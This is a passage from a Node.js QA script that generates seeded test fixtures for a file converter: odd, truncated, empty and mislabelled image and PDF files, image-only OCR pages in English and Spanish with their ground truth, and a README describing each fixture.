write("IMAGE-L", "IMAGE-L-tiny-optimized.jpg", photo(480, 320, 20012, { noise: 8 }).toBuffer("image/jpeg", 60), "Very small optimized JPEG 480x320 q60", "baseline JPEG");

// ================================================================== Extras for converters and error cases
write("X-ODD", "X-odd-1001x777.png", photo(1001, 777, 30001, { noise: 10 }).toBuffer("image/png"), "Odd dimensions 1001x777 opaque PNG", "PNG");
write("X-PORT", "X-portrait-1200x1800.jpg", photo(1200, 1800, 30002, { noise: 14 }).toBuffer("image/jpeg", 88), "Portrait 1200x1800 JPEG", "JPEG");
write("X-TINY", "X-tiny-64x48.png", photo(64, 48, 30003, { noise: 4, alpha: true }).toBuffer("image/png"), "Tiny 64x48 transparent PNG", "PNG RGBA");
write("X-WEBPA", "X-transparent.webp", photo(900, 700, 30004, { noise: 8, alpha: true }).toBuffer("image/webp", 90), "Transparent WebP 900x700", "lossy WebP with alpha");
{
  const b = fs.readFileSync(path.join(OUT, "IMAGE-B-photo-500k.jpg"));
  write("X-CORRUPT", "X-corrupt.jpg", b.subarray(0, 4000), "Corrupt JPEG: first 4,000 bytes of IMAGE-B (header only, no image data)", "truncated JPEG");
}
{
  const b = fs.readFileSync(path.join(OUT, "IMAGE-B-photo-500k.jpg"));
  write("X-HALF", "X-truncated-half.jpg", b.subarray(0, Math.floor(b.length / 2)), "JPEG cut off halfway through the image data (browsers show the bottom half grey, no error)", "truncated JPEG, no EOI");
}
write("X-ZERO-JPG", "X-zero-byte.jpg", Buffer.alloc(0), "Zero-byte .jpg", "empty");
write("X-ZERO-PDF", "X-zero-byte.pdf", Buffer.alloc(0), "Zero-byte .pdf", "empty");
write("X-GIF", "X-animation.gif", Buffer.from("R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==", "base64"), "1x1 GIF (unsupported format)", "GIF89a");
write("X-TXT", "X-notes.txt", Buffer.from("Meeting notes\nNothing to convert here.\n"), "Plain text file (wrong type for every tool)", "text");
write("X-FAKEPDF", "X-fake.pdf", Buffer.from("This is not a PDF, it only has the extension.\n"), "Text content with a .pdf extension", "text");
write("X-JPGASPNG", "X-jpeg-named.png", fs.readFileSync(path.join(OUT, "IMAGE-L-tiny-optimized.jpg")), "A JPEG saved with a .png extension (mislabelled but valid)", "JPEG bytes, .png name");

// ================================================================== OCR (image-only pages with known text)
const EN = [
  "The committee met on Tuesday to review the budget.",
  "Invoice number 48213 was paid on 03/14/2026.",
  "Please return the signed form to Jordan Smith.",
  "Total amount due: 1,250.00 dollars.",
  "Delivery is scheduled for the morning of Friday.",
  "Contact the office at extension 4417 for details.",
];
const ES = [
  "El informe anual muestra que la producción aumentó.",
  "La reunión será el miércoles a las diez de la mañana.",
  "Por favor, envíe el formulario firmado a la oficina.",
  "El pago total fue de mil doscientos euros.",
];
function textPage(lines, { dpi = 300, fg = "#111", bg = "#fbfaf6", skew = 0, grain = 6, seed = 1 } = {}) {
  const w = Math.round(8.5 * dpi), h = Math.round(11 * dpi);
  const c = createCanvas(w, h);
  const g = c.getContext("2d");
  g.fillStyle = bg;
  g.fillRect(0, 0, w, h);
  g.save();
  g.translate(w / 2, h / 2);
  g.rotate((skew * Math.PI) / 180);
  g.translate(-w / 2, -h / 2);
  g.fillStyle = fg;
  const px = (12 / 72) * dpi;
  g.font = `${Math.round(px)}px Arial`;
  lines.forEach((l, i) => g.fillText(l, dpi * 1, dpi * 1.4 + i * px * 2));
  g.restore();
  if (grain) {
    const r = rng(seed);
    const img = g.getImageData(0, 0, w, h);
    for (let i = 0; i < img.data.length; i += 4) {
      const n = (r() - 0.5) * grain * 2;
      img.data[i] = clamp(img.data[i] + n);
      img.data[i + 1] = clamp(img.data[i + 1] + n);
      img.data[i + 2] = clamp(img.data[i + 2] + n);
    }
    g.putImageData(img, 0, 0);
  }
  return c;
}
async function ocrPdf(pages, { rotate = 0, nativeHeader = null } = {}) {
  const doc = await PDFDocument.create();
  const { bold } = await withFonts(doc);
  for (let canvas of pages) {
    let size = [612, 792];
    if (rotate === 90) {
      // Stored sideways (the scanner fed it landscape) and flagged /Rotate 90 so it displays upright.
      const side = createCanvas(canvas.height, canvas.width);
      const g = side.getContext("2d");
      g.translate(0, canvas.width);
      g.rotate(-Math.PI / 2);
      g.drawImage(canvas, 0, 0);
      canvas = side;
      size = [792, 612];
    }
    const page = doc.addPage(size);
    page.drawImage(await doc.embedJpg(canvas.toBuffer("image/jpeg", 85)), { x: 0, y: 0, width: size[0], height: size[1] });
    if (nativeHeader) page.drawText(nativeHeader, { x: 72, y: 760, size: 14, font: bold });
    if (rotate) page.setRotation(degrees(rotate));
  }
  return doc.save();
}
const ocrRows = [];
async function ocrFixture(id, name, bytes, what, truth, lang = "eng") {
  write(id, name, bytes, what, `image-only JPEG page(s); OCR language ${lang}`);
  ocrRows.push({ id, name, truth, lang });
}
await ocrFixture("OCR-A", "OCR-A-clean-300dpi.pdf", await ocrPdf([textPage(EN, { seed: 1 })]), "Clean 300 dpi English page", EN);
await ocrFixture("OCR-B", "OCR-B-low-res-100dpi.pdf", await ocrPdf([textPage(EN, { dpi: 100, seed: 2 })]), "Low-resolution 100 dpi English page", EN);
await ocrFixture("OCR-C", "OCR-C-low-contrast.pdf", await ocrPdf([textPage(EN, { dpi: 200, fg: "#8c8c8c", bg: "#c9c9c9", grain: 10, seed: 3 })]), "Low contrast (grey on grey) 200 dpi English page", EN);
await ocrFixture("OCR-D", "OCR-D-rotated.pdf", await ocrPdf([textPage(EN, { skew: 1.5, seed: 4 })], { rotate: 90 }), "English page scanned sideways (stored landscape) with /Rotate 90 so it displays upright, plus a 1.5° skew", EN);
await ocrFixture("OCR-E", "OCR-E-spanish.pdf", await ocrPdf([textPage(ES, { seed: 5 })]), "Clean 300 dpi Spanish page (accents: producción, miércoles, mañana, envíe)", ES, "spa");
await ocrFixture("OCR-F", "OCR-F-mixed-native-scan.pdf", await ocrPdf([textPage(EN, { seed: 6 })], { nativeHeader: "NATIVE HEADER LINE" }), "Scanned body with a native-text header line on top", EN);
const ES_PLAIN = ES.slice(0, 2).map((s) => s.normalize("NFD").replace(/[̀-ͯ]/g, ""));
await ocrFixture("OCR-G", "OCR-G-multipage.pdf", await ocrPdf([textPage(EN.slice(0, 3), { seed: 7 }), textPage(EN.slice(3), { seed: 8 }), textPage(ES_PLAIN, { seed: 9 })]), "3 scanned pages (EN, EN, unaccented ES)", [...EN, ...ES_PLAIN]);
fs.writeFileSync(path.join(OUT, "ocr-truth.json"), JSON.stringify(ocrRows, null, 1));

// ------------------------------------------------------------------ README
const md = [
  "# Fresh scenario fixtures",
  "",
  "Generated by `node qa/scripts/fs-fixtures.mjs` (seeded PRNG, so the content is the same on every run; PDF byte counts can differ by a few bytes because pdf-lib stamps creation dates). **None of these are real documents.**",
  "The binaries are git-ignored (the largest is ~20 MB); this README records exactly what each one is.",
  "",
  "The real user-supplied scan used for the reported corruption bug is **not** copied here; scripts read it in place from",
  "`C:\\Users\\ravit\\Downloads\\TheFileConvert_Scanned_OCR_Test.pdf` (3,982,736 bytes) — the only Downloads file QA may touch.",
  "",
  "| ID | File | Bytes | SHA-256 (12) | What | Structure |",
  "|---|---|---:|---|---|---|",
  ...rows.map((r) => `| ${r.id} | ${r.name} | ${r.bytes.toLocaleString("en-US")} | \`${r.sha}\` | ${r.what} | ${r.structure} |`),
  "",
  "Negative fixtures: PDF-O (corrupted) and PDF-P (encrypted, password `user-pw`) must be refused with a clear message, never produce output.",
  "IMAGE-J (unsafe SVG) must be rendered without running its script or fetching any of its external URLs.",
  "",
];
fs.writeFileSync(path.join(OUT, "README.md"), md.join("\n"));
fs.writeFileSync(path.join(OUT, "fixtures.json"), JSON.stringify(rows, null, 1));
